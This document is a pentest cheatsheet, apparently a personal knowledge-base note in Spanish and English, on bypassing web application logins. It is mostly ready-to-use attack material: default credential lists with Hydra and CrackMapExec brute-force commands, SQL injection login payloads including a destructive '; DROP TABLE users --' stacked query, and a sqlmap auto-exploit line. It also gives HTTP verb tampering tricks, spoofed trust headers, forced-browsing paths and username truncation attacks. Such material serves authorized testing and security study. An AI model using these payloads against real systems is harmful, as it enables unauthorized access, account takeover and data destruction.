---
aliases:
  - Login Bypass
  - SQLi Login
  - Verb Tampering
  - Forced Browsing
tags:
  - type/cheatsheet
  - vuln/auth-bypass
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Authentication & Authorization Bypass]]'
---
# Auth Bypass - Bypass de Autenticación

***

## Default Credentials

| **Combo** | **Stack típico** | **Notas** |
|:---:|:---:|:---:|
| `admin:admin` | Generic | Top guess. |
| `admin:password` | Generic | Same. |
| `root:root` | Linux apps | OS-style. |
| `admin:1234` / `admin:12345` | IoT / routers | Numeric. |
| `tomcat:s3cret`, `manager:password` | Tomcat manager | Known defaults. |
| `admin:admin123` | WordPress / generic | Common. |
| `cisco:cisco` | Network gear | Standard. |
| `pi:raspberry` | Raspberry Pi | Default. |
| `kali:kali` | Kali Linux | Default. |
| `vagrant:vagrant` | Vagrant VM | Default. |
| `oracle:oracle` | Oracle DB | Standard. |
| `postgres:postgres` | PostgreSQL | Standard. |
| `mysql:` (empty) | MySQL old defaults | Edge. |
| `sa:` (empty) | MS SQL legacy | Bypass. |
| `guest:guest` | Multiple stacks | Standard. |
| `test:test` | Dev environments | Standard. |
| `manager:manager` | Tomcat / others | Standard. |
| `admin:<empty>` | Some routers / appliances | Edge. |
| Vendor-specific docs | Look up product → defaults página | OSINT. |
| `assetnote/wordlists` default-creds | Curated list | Modern. |
| `seclists/Passwords/Default-Credentials` | Comprehensive | Standard. |
^auth-bypass-defaults

### Tooling default creds

```bash
# Hydra con defaults
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
      target.com https-post-form \
      "/login:user=^USER^&pass=^PASS^:F=Invalid"

# CrackMapExec for protocols
crackmapexec smb target -u admin -p password
crackmapexec ssh target -u root -p root

# Default cred scanners
nuclei -t http/default-logins/ -u https://target/
```

___

## SQL Injection en Login

| **Payload (username)** | **Payload (password)** | **Notas** |
|:---:|:---:|:---:|
| `admin' OR '1'='1' -- ` | `anything` | Classic. |
| `admin' OR 1=1 -- ` | `anything` | Variant. |
| `' OR 1=1 -- ` | `' OR 1=1 -- ` | Both fields. |
| `admin'-- ` | `anything` | Comment closes filter. |
| `admin'/*` | `anything` | Multi-line comment. |
| `admin' #` | `anything` | MySQL comment. |
| `admin' AND 1=2 UNION SELECT 1,'admin','admin' -- ` | `admin` | Union for fake row. |
| `admin' OR username='admin` | `admin` | Direct match. |
| Numeric `1 OR 1=1` | sin quotes | Numeric column. |
| Stacked `; DROP TABLE users -- ` | n/a | Stacked queries (risky en pentest). |
| `admin' )-- ` | sin quotes | Close paréntesis. |
| Boolean blind | `' OR (SELECT 1) -- ` | Confirm boolean. |
| Time-based | `' OR (SELECT SLEEP(5)) -- ` | Timing oracle. |
| `' UNION SELECT 1,2,3,4 -- ` | sin quotes | Union enumeration. |
| Encoded variants | URL-encoded `%27` etc | Bypass filter. |
| sqlmap on login | `sqlmap -u https://target/login --data='user=x&pass=x' --forms` | Auto-exploit. |
^auth-bypass-sqli

___

## HTTP Verb Tampering

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| GET → POST | If `/admin` checked solo en GET, POST bypasses | Common bug. |
| POST → GET | Sometimes opposite | Per-config. |
| PUT instead | `PUT /admin` accepted sin auth | Edge. |
| DELETE | `DELETE /admin` | Same. |
| PATCH | `PATCH /admin` | Modern API. |
| OPTIONS | `OPTIONS /admin` returns method list | Recon. |
| HEAD | `HEAD /admin` returns headers but no body | Filter bypass para info disclosure. |
| TRACE | `TRACE /admin` legacy diagnostic | Edge. |
| CONNECT | Tunneling method | Edge. |
| Random method | `FOO /admin` | Some servers default to GET. |
| Method override headers | `X-HTTP-Method-Override: PUT` | Backend converts. |
| Form `_method` field | `_method=DELETE` en form | Rails / Symfony. |
| Query string `_method` | `?_method=DELETE` | Same. |
| Lowercase | `get /admin` (some servers strict) | Edge. |
| Mixed case | `GeT /admin` | Same. |
| With trailing data | `GET /admin\r\n` | Edge. |
^auth-bypass-verb

___

## Header Spoofing

| **Header** | **Payload** | **Bypass target** |
|:---:|:---:|:---:|
| `X-Forwarded-For: 127.0.0.1` | Internal IP allowlist | Bypass IP-based ACL. |
| `X-Real-IP: 127.0.0.1` | Same | Variant. |
| `Client-IP: 127.0.0.1` | Less common | Edge. |
| `X-Originating-IP: 127.0.0.1` | Less common | Edge. |
| `True-Client-IP: 127.0.0.1` | Akamai-style | Same. |
| `X-Forwarded-Host: localhost` | Internal vhost trust | HHI. |
| `X-Original-URL: /admin` | Path-based middleware bypass | IIS quirk. |
| `X-Rewrite-URL: /admin` | Variant | IIS. |
| `X-Override-URL: /admin` | Custom | Edge. |
| `X-Original-URI: /admin` | Variant | Same. |
| `Referer: https://target.com/admin` | Some apps trust Referer | Edge bypass. |
| `Origin: https://target.com` | CORS-trust | If trust header. |
| `Authorization: Basic YWRtaW46YWRtaW4=` | Base64(`admin:admin`) | Common. |
| `X-Username: admin` | Custom auth header | If trusted. |
| `X-Authenticated-User: admin` | Same | Same. |
| `X-User-Id: 1` | Numeric injection | Edge. |
| `X-Forwarded-User` | Apache / nginx auth | Some configs. |
| `X-Remote-User` | Same family | Some configs. |
| Custom IP from internal | `X-Cluster-Client-IP: 10.0.0.1` | Internal trust. |
^auth-bypass-headers

___

## Forced Browsing (Direct Access)

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Direct admin URL | `GET /admin` sin auth | If client-side check only. |
| Predictable paths | `/admin`, `/admin.php`, `/administrator`, `/manage`, `/dashboard` | Common. |
| API endpoint direct | `/api/admin/users` sin token | Backend trusts token presence. |
| Route guess | Brute force con dirsearch / ffuf | Discovery. |
| Path traversal en URL | `/public/../admin` | Combined. |
| Path normalization | `//admin`, `/./admin`, `/.//admin` | Bypass routers. |
| Trailing slash | `/admin/` vs `/admin` | Different routes. |
| Static file equivalent | `/admin.html` instead de `/admin` | Server variations. |
| Old version path | `/v1/admin` vs `/v2/admin` | Per-version. |
| Backup path | `/admin.bak`, `/.admin` | Hidden. |
| Dev/staging URLs | `/dev/admin`, `/staging/admin` | Lower restrictions. |
| Robots.txt disclosed | `/robots.txt` lists hidden admin | Recon. |
| .git / .env exposure | Source code disclosure → reveals admin URLs | OSINT. |
| Sitemap.xml | All URLs listed | Recon. |
| Wayback Machine | Old URLs from history | OSINT. |
| Dirsearch wordlist | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` | Standard. |
^auth-bypass-forced

___

## Truncation Attack

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | DB column has fixed length. App appends spaces / chars then DB truncates → match. | Old attack. |
| Username truncation | `admin                    x` (con padding spaces) | If DB col VARCHAR(20). |
| MS SQL whitespace ignore | `admin\r\n\r\n\r\n` truncated | SQL Server. |
| MySQL strict mode | If not strict → trailing whitespace ignored | Configuration. |
| NUL byte truncation | `admin\x00garbage` | C-string truncation. |
| MySQL `CHAR(N)` padding | Char column right-pads → match | Edge. |
| Combine con register | Register `admin` + spaces + atacante's password | Account hijack. |
| Force column overflow | If DB doesn't reject long input, truncates | Standard. |
| Combine con LDAP injection | Similar concept en LDAP | Adjacent. |
| Mass register attack | Many similar usernames → DB confusion | Edge. |
^auth-bypass-truncation

***
